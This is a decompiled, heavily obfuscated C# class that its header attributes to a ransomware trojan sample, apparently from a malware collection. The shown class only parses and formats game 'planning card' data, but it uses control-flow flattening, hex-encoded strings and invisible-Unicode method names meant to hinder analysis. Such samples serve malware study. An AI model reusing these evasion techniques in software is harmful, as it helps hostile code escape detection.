// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: ContractHelp, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E915048-53CD-4869-AA6D-7821BA258ED2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-226153caf46a7078970ce7ca5feb4aac6882ecb128e89ec40abb3be26166dd41.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -1437945476;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1237496383)) % 9U)
        {
          case 1:
            str1 = "3163356B67";
            num1 = (int) num2 * 802220688 ^ -1060632051;
            continue;
          case 2:
            num1 = (int) num2 * 905640079 ^ -1575690470;
            continue;
          case 3:
            num1 = (int) num2 * 704831817 ^ -297018144;
            continue;
          case 4:
            int num3;
            num1 = num3 = BaseStream == 1 ? -1680905465 : (num3 = -900808339);
            continue;
          case 5:
            str2 = str1;
            num1 = -1521842117;
            continue;
          case 6:
            str1 = (string) null;
            int num4 = BaseStream != 0 ? -2084359250 : (num4 = -1557086967);
            num1 = num4 ^ (int) num2 * -1460711256;
            continue;
          case 7:
            str1 = "436F6E736F6C6543616E63656C4576656E7448616E646C";
            num1 = (int) num2 * -33649929 ^ -1744487857;
            continue;
          case 8:
            goto label_1;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -1167133319;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ -844036709)) % 3U)
      {
        case 1:
          num4 = 0;
          goto label_5;
        case 2:
          goto label_1;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = -1175562679;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 819406338;
        int index;
        int num2;
        int[] planningCards;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1573038001)) % 13U)
          {
            case 0:
              ++index;
              num1 = 114520088;
              continue;
            case 1:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * 1306539207 ^ 1436660494;
              continue;
            case 2:
              ++num3;
              num1 = (int) num4 * 1688346533 ^ 1896399773;
              continue;
            case 4:
              num3 = 0;
              num1 = (int) num4 * -1313324929 ^ 592126938;
              continue;
            case 5:
              num1 = (int) num4 * -1306449534 ^ 166839473;
              continue;
            case 6:
              num2 = planningCards[index];
              num1 = 595234080;
              continue;
            case 7:
              planningCardsCount = num3;
              num1 = (int) num4 * 1346302385 ^ 310661572;
              continue;
            case 8:
              int num5 = num2 <= 0 ? 650853878 : (num5 = 635555454);
              num1 = num5 ^ (int) num4 * -185829992;
              continue;
            case 9:
              goto label_1;
            case 10:
              int num6;
              num1 = num6 = index < planningCards.Length ? 2093105449 : (num6 = 299951407);
              continue;
            case 11:
              index = 0;
              num1 = (int) num4 * -1816586186 ^ -1450008732;
              continue;
            case 12:
              num1 = (int) num4 * -1342358873 ^ -1919501624;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_1:
      int num1 = -52274432;
      int planningCard;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2000553116)) % 11U)
        {
          case 0:
            ++index;
            num1 = -1225350679;
            continue;
          case 1:
            num1 = (int) num2 * -2082729901 ^ 1433788805;
            continue;
          case 2:
            planningCard = this.PlanningCards[index];
            int num3;
            num1 = num3 = planningCard == 0 ? -1626164892 : (num3 = -2089933701);
            continue;
          case 3:
            num1 = (int) num2 * -106825362 ^ -568052265;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * -1497606855 ^ 501056753;
            continue;
          case 6:
            flag = index < this.PlanningCards.Length;
            num1 = -871256832;
            continue;
          case 7:
            int num4 = !flag ? 463973056 : (num4 = 315178695);
            num1 = num4 ^ (int) num2 * -1286883823;
            continue;
          case 8:
            str2 = str1;
            num1 = (int) num2 * 855772656 ^ -949621569;
            continue;
          case 9:
            str1 = Player.\u200E‍⁭‏⁪‬⁮‭‏⁭‪⁫‬⁭⁫​⁮⁭⁯‏​⁭⁮‏‪‌⁮⁭‬⁬⁬‬⁭‬‬‌⁪​‎⁪‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1746404905;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1530772360;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 130530150)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 1521509774 ^ -556272600;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
      int[] numArray = new int[count];
      int aIndex = 0;
label_1:
      int num1 = 185016610;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1845547076)) % 7U)
        {
          case 1:
            num1 = (int) num2 * 1964772772 ^ -444158628;
            continue;
          case 2:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 1913358978;
            continue;
          case 3:
            planningCards = numArray;
            num1 = (int) num2 * -685071383 ^ -358026760;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * -2145512349 ^ -1997940496;
            continue;
          case 6:
            int num3;
            num1 = num3 = aIndex >= count ? 28777501 : (num3 = 1825948668);
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 213331530;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 341522301)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1262454649 ^ 908331822;
            continue;
          case 3:
            str = Player.\u200E‭‍⁭⁬‪‭‍⁪⁪⁯⁯‫‭⁭⁭‮‪⁫‏⁫‍‍‮‍‬​‭‭‏‫⁫‮⁯⁪‎‎‮​⁮‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 1341664369 ^ -72239845;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200E‍⁭‏⁪‬⁮‭‏⁭‪⁫‬⁭⁫​⁮⁭⁯‏​⁭⁮‏‪‌⁮⁭‬⁬⁬‬⁭‬‬‌⁪​‎⁪‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200E‭‍⁭⁬‪‭‍⁪⁪⁯⁯‫‭⁭⁭‮‪⁫‏⁫‍‍‮‍‬​‭‭‏‫⁫‮⁯⁪‎‎‮​⁮‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
